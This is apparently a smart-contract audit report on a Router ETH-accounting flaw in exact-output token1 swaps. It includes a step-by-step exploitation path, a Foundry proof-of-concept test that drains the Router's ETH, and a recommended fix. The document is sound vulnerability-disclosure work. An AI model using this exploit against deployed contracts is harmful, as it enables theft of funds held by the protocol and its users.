## Title
Router ETH Payment Logic Bypass Allowing Theft of Router's ETH Balance via Exact Output Token1 Swaps

## Summary
The Router contract's ETH handling logic contains a critical mismatch between when `msg.value` is captured in the `value` variable and when ETH debt settlement occurs. When executing exact output swaps where `isToken1=true` and `token0=NATIVE_TOKEN_ADDRESS`, the Router pays the required ETH from its own accumulated balance rather than from the user's `msg.value`, enabling attackers to drain the Router's ETH without paying.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Router.sol` (handleLockData function, lines 94-150) [1](#0-0) [2](#0-1) 

**Intended Logic:** When users execute swaps requiring ETH payment, they should send ETH via `msg.value`, which gets forwarded to Core and properly tracked in the flash accounting system. Any excess ETH should be refunded to the user.

**Actual Logic:** The `value` variable (lines 106-110) is only set to a non-zero amount when `!params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS`. However, there are other swap scenarios where ETH payment is required but this condition is not met. Specifically, when:
- `params.isToken1() = true` (swapping token1, buying token1 with ETH as input)
- `params.isExactOut() = true` (amount < 0, specifying exact output)
- `poolKey.token0 == NATIVE_TOKEN_ADDRESS`

In this case, `value` remains 0, but the swap requires ETH payment. The price direction calculation `increasing = xor(true, true) = false` causes execution to reach the ETH handling block at lines 134-146. Since `value = 0` but `balanceUpdate.delta0() > 0` (ETH owed), the `valueDifference` becomes negative (line 135), triggering line 141 to send ETH from the Router's contract balance to the Accountant. [3](#0-2) [4](#0-3) 

**Exploitation Path:**
1. Attacker identifies that Router has accumulated ETH balance (from previous user swaps with `refundNativeToken()` not called, or multicall operations)
2. Attacker calls `Router.swap()` with:
   - `poolKey.token0 = NATIVE_TOKEN_ADDRESS` (0x0)
   - `poolKey.token1 = <any ERC20 token address>`
   - `params` encoded with `isToken1 = true`, `amount = -X` (negative for exact output)
   - `msg.value = 0` (no ETH sent!)
3. In `handleLockData`, `value = 0` because the condition at line 107 fails (`isToken1 = true`)
4. `Core.swap(0, poolKey, params)` executes with no ETH forwarded, creating a positive debt for ETH
5. Upon return, `valueDifference = 0 - balanceUpdate.delta0() < 0` triggers `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), ...)` using Router's balance
6. Router's ETH is sent to Accountant, settling the debt via the `receive()` function
7. Attacker receives the output tokens without paying any ETH [5](#0-4) 

**Security Property Broken:** Direct theft of protocol-held funds. The Router contract loses ETH without receiving payment from users, violating the fundamental invariant that users must pay for swaps.

## Impact Explanation
- **Affected Assets**: All ETH held in the Router contract's balance
- **Damage Severity**: Complete drainage of Router's ETH balance. Any ETH accumulated from user operations (via `multicall()` with partial ETH usage, or users not calling `refundNativeToken()`) can be stolen. In a high-volume DEX, this could accumulate to substantial amounts.
- **User Impact**: Users who deposited ETH to Router for legitimate swaps lose their funds. The Router is designed to be payable and hold temporary ETH balances via `PayableMulticallable` inheritance. [6](#0-5) 

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this. No special permissions required.
- **Preconditions**: 
  1. Router must have non-zero ETH balance (realistic in production)
  2. A pool with `token0 = NATIVE_TOKEN_ADDRESS` must exist with liquidity
  3. No special timing or state required
- **Execution Complexity**: Single transaction with standard `Router.swap()` call. Parameters are straightforward to craft.
- **Frequency**: Can be exploited continuously until Router's ETH is drained. Each exploit steals the ETH cost of one swap transaction.

## Recommendation

The `value` calculation should also capture `msg.value` when the user is buying token1 with ETH (token0) in exact output scenarios:

```solidity
// In src/Router.sol, lines 106-110:

// CURRENT (vulnerable):
uint256 value = FixedPointMathLib.ternary(
    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
    uint128(params.amount()),
    0
);

// FIXED:
uint256 value = 0;
if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    if (!params.isToken1() && !params.isExactOut()) {
        // Exact input ETH: user knows exact amount to send
        value = uint128(params.amount());
    } else if (params.isToken1() && params.isExactOut()) {
        // Exact output token1, paying with ETH: forward all msg.value,
        // refund excess after swap
        value = msg.value;
    }
}
```

Alternative approach: Remove the special ETH handling in the single swap path and require users to send ETH via multicall with explicit payment calls, similar to the multihop swap pattern at lines 229-234.

## Proof of Concept

```solidity
// File: test/Exploit_RouterETHTheft.t.sol
// Run with: forge test --match-test test_RouterETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "./FullTest.sol";

contract Exploit_RouterETHTheft is FullTest {
    
    function test_RouterETHTheft() public {
        // SETUP: Create ETH pool (token0 = NATIVE_TOKEN_ADDRESS)
        PoolKey memory poolKey = createFullRangeETHPool(0, 1 << 63);
        createPosition(poolKey, MIN_TICK, MAX_TICK, 1 ether, 1 ether);
        
        // Simulate Router having accumulated ETH (from previous operations)
        vm.deal(address(router), 1 ether);
        uint256 routerBalanceBefore = address(router).balance;
        console.log("Router ETH balance before:", routerBalanceBefore);
        
        // Attacker prepares: needs token1 approval only (will not pay ETH!)
        token1.approve(address(router), type(uint256).max);
        
        uint256 attackerETHBefore = address(this).balance;
        uint256 attackerToken1Before = token1.balanceOf(address(this));
        
        // EXPLOIT: Execute exact output swap for token1, paying with ETH
        // isToken1=true, amount negative (exact output), NO msg.value sent!
        router.swap{value: 0}({
            poolKey: poolKey,
            params: createSwapParameters({
                _sqrtRatioLimit: SqrtRatio.wrap(0),
                _skipAhead: 0,
                _isToken1: true,
                _amount: -1000  // Want 1000 of token1 (negative = exact output)
            }),
            calculatedAmountThreshold: type(int256).min
        });
        
        // VERIFY: Attacker received tokens without paying ETH
        uint256 attackerETHAfter = address(this).balance;
        uint256 attackerToken1After = token1.balanceOf(address(this));
        uint256 routerBalanceAfter = address(router).balance;
        
        console.log("Attacker ETH spent:", attackerETHBefore - attackerETHAfter);
        console.log("Attacker token1 gained:", attackerToken1After - attackerToken1Before);
        console.log("Router ETH balance after:", routerBalanceAfter);
        console.log("Router ETH stolen:", routerBalanceBefore - routerBalanceAfter);
        
        assertEq(attackerETHBefore, attackerETHAfter, "Attacker paid no ETH");
        assertGt(attackerToken1After, attackerToken1Before, "Attacker received tokens");
        assertLt(routerBalanceAfter, routerBalanceBefore, "Router lost ETH");
        
        // Vulnerability confirmed: attacker got tokens using Router's ETH!
    }
}
```

## Notes

This vulnerability specifically affects the single-swap code path (CALL_TYPE_SINGLE_SWAP). The multihop swap paths handle ETH differently and are not affected by this issue. The root cause is the incomplete conditional logic at lines 106-110 that fails to account for all scenarios where ETH payment is required. The Router's design as a `PayableMulticallable` contract means it legitimately accumulates ETH balance, making this vulnerability highly exploitable in production environments.

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L112-114)
```text
                bool increasing = params.isPriceIncreasing();

                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```

**File:** src/Router.sol (L134-146)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/Core.sol (L340-345)
```text
            if (token0 == NATIVE_TOKEN_ADDRESS) {
                unchecked {
                    // token0 is native, so we can still use pair update with adjusted debtChange0
                    // Subtraction is safe because debtChange0 and msg.value are both bounded by int128/uint128
                    _updatePairDebt(id, token0, token1, debtChange0 - int256(msg.value), debtChange1);
                }
```

**File:** src/base/FlashAccountant.sol (L384-393)
```text
    receive() external payable {
        uint256 id = _getLocker().id();

        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
        unchecked {
            // We assume msg.value will never exceed type(uint128).max, so this should never cause an overflow/underflow of debt
            _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
        }
    }
```

**File:** src/base/PayableMulticallable.sol (L17-29)
```text
    function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
        _multicallDirectReturn(_multicall(data));
    }

    /// @notice Refunds any remaining native token balance to the caller
    /// @dev Allows callers to recover ETH that was sent for transient payments but not fully consumed
    ///      This is useful when exact payment amounts are difficult to calculate in advance
    ///      Only refunds if there is a non-zero balance to avoid unnecessary gas costs
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
